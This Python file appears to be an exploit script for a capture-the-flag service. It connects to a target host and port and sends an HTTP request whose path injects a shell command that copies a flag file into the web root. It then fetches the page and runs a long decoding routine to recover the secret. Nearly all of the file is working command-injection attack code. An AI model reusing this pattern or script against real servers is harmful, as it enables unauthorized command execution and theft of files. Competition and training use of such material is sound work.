#!/usr/bin/env python

from socket import *
import sys

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return buf
        buf += newbuf
        count -= len(newbuf)
    return buf

def dec(cip):
    cip = list(cip)
    length = len(cip)
    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

    for i in range(length - 2, -1, -1):
        cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)
    return ''.join(cip)


HOST = sys.argv[1]
PORT = int(sys.argv[2])
BUFSIZE = 1024
ADDR = (HOST, PORT)

s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(ADDR)
except Exception as e:
    print('Cannot connect to the server.')
    print(e)
    print("IP address is %s" %HOST)
    print("Port number is %d" %PORT)
    sys.exit()

s.send("GET /|cp%20/var/ctf/flag%20./htdocs/index.html HTTP/1.1\r\n\r\n")
output = recvall(s, BUFSIZE)
s.close()


s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(ADDR)
except Exception as e:
    print('Cannot connect to the server.')
    sys.exit()
s.send("GET / HTTP/1.1\r\n\r\n")
output = recvall(s, BUFSIZE)
output = output.split()
#print(output)
flag = dec(output[-1])
#print(output)


#flag = output[-1]
sys.stdout.write(flag)
